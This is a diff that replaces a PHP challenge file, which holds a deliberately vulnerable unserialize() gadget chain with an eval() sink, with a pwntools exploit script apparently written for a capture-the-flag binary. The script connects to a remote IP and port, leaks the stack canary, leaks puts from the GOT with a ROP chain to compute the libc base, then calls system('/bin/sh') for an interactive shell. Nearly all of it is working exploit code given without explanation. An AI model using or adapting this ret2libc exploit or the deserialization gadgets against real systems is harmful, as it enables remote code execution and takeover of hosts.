@@ -1,43 +1,38 @@
- <?php
-highlight_file(__FILE__);
-class TT{
-    public $key;
-    public $c;
-    public function __destruct(){
-        echo $this->key;
-    }
+from pwn import *
 
-    public function __toString(){
-        return "welcome";
-    }
-}
+context(arch="amd64", log_level='debug')
 
-class JJ{
-    public $obj;
-    public function __toString(){
-        ($this -> obj)();
-        return "1";
-    }
-    public function evil($c){
-        eval($c);
-    }
-    public function __sleep(){
-        phpinfo();
-    }
-}
+current_dir=os.getcwd();
+file_path=os.path.join(current_dir,"pwn2")
+file_path_so=os.path.join(current_dir,"libc.so.6")
+e = ELF(file_path)
+libc = ELF(file_path_so)
 
-class MM{
-    public $name;
-    public $c;
-    public function __invoke(){
-        ($this->name)($this->c);
-    }
-    public function __toString(){
-        return "ok,but wrong";
-    }
-    public function __call($a, $b){
-        echo "Hacker!";
-    }
-}
-$a = unserialize($_GET['bbb']);
-throw new Error("NoNoNo"); 
+p = remote('39.107.234.204', '30372')
+
+puts_plt_addr = e.symbols["puts"]
+puts_got_addr = e.got["puts"]
+main_addr = e.symbols["main"]
+rdi_addr = 0x401363
+ret = 0x401364
+
+p.sendline(b'a' * (0x30 - 10) + b'b')
+p.recvuntil(b'b\n')
+canary = u64(p.recv(8))
+print(hex(canary))
+
+payload = b'a' * (0x30 - 8) + p64(canary) + p64(0) + p64(rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
+p.sendlineafter(b'input: \n', payload)
+
+puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+print(hex(puts_addr))
+
+base_addr = puts_addr - libc.sym['puts']
+system_addr = base_addr + libc.sym['system']
+binsh_addr = base_addr + next(libc.search(b'/bin/sh'))
+print(hex(system_addr))
+print(hex(binsh_addr))
+
+payload2 = b'a' * (0x30 - 8) + p64(canary) + p64(0) + p64(ret) + p64(rdi_addr) + p64(binsh_addr) + p64(system_addr)
+p.sendlineafter(b'input: \n', payload2)
+p.interactive()
